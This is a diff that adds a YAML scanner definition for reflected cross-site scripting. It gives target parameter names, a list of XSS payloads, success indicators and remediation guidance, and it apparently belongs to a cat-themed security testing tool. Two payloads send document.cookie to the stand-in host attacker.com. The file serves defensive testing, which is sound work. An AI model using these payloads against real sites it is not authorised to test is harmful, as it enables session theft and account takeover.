@@ -1,0 +1,118 @@
+# XSS (Cross-Site Scripting) - Reflected
+name: "XSS - Reflected"
+category: "injection"
+severity: "high"
+description: "Tests for reflected cross-site scripting vulnerabilities where user input is echoed back in responses without proper encoding."
+
+target_fields:
+  - "search"
+  - "query"
+  - "q"
+  - "keyword"
+  - "name"
+  - "title"
+  - "message"
+  - "content"
+  - "comment"
+  - "feedback"
+  - "callback"
+  - "redirect"
+  - "url"
+  - "return"
+
+payloads:
+  # Basic script injection
+  - "<script>alert('XSS')</script>"
+  - "<script>alert(String.fromCharCode(88,83,83))</script>"
+  - "<script>alert(document.domain)</script>"
+  
+  # Event handlers
+  - "<img src=x onerror=alert('XSS')>"
+  - "<svg onload=alert('XSS')>"
+  - "<body onload=alert('XSS')>"
+  - "<input onfocus=alert('XSS') autofocus>"
+  - "<marquee onstart=alert('XSS')>"
+  - "<video src=x onerror=alert('XSS')>"
+  - "<audio src=x onerror=alert('XSS')>"
+  
+  # Encoded payloads
+  - "<script>alert&#40;'XSS'&#41;</script>"
+  - "<img src=x onerror=alert&#x28;&#x27;XSS&#x27;&#x29;>"
+  - "&#60;script&#62;alert('XSS')&#60;/script&#62;"
+  
+  # JavaScript protocol
+  - "javascript:alert('XSS')"
+  - "javascript:alert(document.cookie)"
+  
+  # SVG-based
+  - "<svg><script>alert('XSS')</script></svg>"
+  - "<svg/onload=alert('XSS')>"
+  
+  # Breaking out of attributes
+  - "' onclick=alert('XSS') '"
+  - "\" onclick=alert('XSS') \""
+  - "' onmouseover=alert('XSS') '"
+  
+  # Template injection probes
+  - "{{7*7}}"
+  - "${7*7}"
+  - "<%= 7*7 %>"
+  
+  # Data exfiltration patterns
+  - "<script>new Image().src='http://attacker.com/'+document.cookie</script>"
+  - "<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>"
+
+success_indicators:
+  response_contains:
+    - "<script>alert"
+    - "onerror=alert"
+    - "onload=alert"
+    - "onclick=alert"
+    - "onmouseover=alert"
+    - "javascript:alert"
+    
+  headers_missing:
+    - "Content-Security-Policy"
+    - "X-XSS-Protection"
+    - "X-Content-Type-Options"
+    
+  response_reflects_input: true
+
+remediation: |
+  🔧 How to Fix XSS Vulnerabilities:
+
+  1. **Output Encoding**: Always encode user input when reflecting it in HTML
+     ```python
+     # Python (Flask)
+     from markupsafe import escape
+     return f"Search results for: {escape(user_input)}"
+     ```
+
+  2. **Content Security Policy**: Add CSP headers
+     ```
+     Content-Security-Policy: default-src 'self'; script-src 'self'
+     ```
+
+  3. **Use Framework Protections**:
+     - React: Uses JSX which auto-escapes
+     - Vue: Uses {{ }} which auto-escapes
+     - Django: Template auto-escaping enabled by default
+
+  4. **Validate and Sanitize Input**:
+     ```python
+     import bleach
+     clean_input = bleach.clean(user_input)
+     ```
+
+  5. **Set Security Headers**:
+     ```
+     X-XSS-Protection: 1; mode=block
+     X-Content-Type-Options: nosniff
+     ```
+
+references:
+  - "https://owasp.org/www-community/attacks/xss/"
+  - "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+  - "https://portswigger.net/web-security/cross-site-scripting"
+
+cat_message: "I batted this shiny string around! 🧶 (XSS payload reflected)"
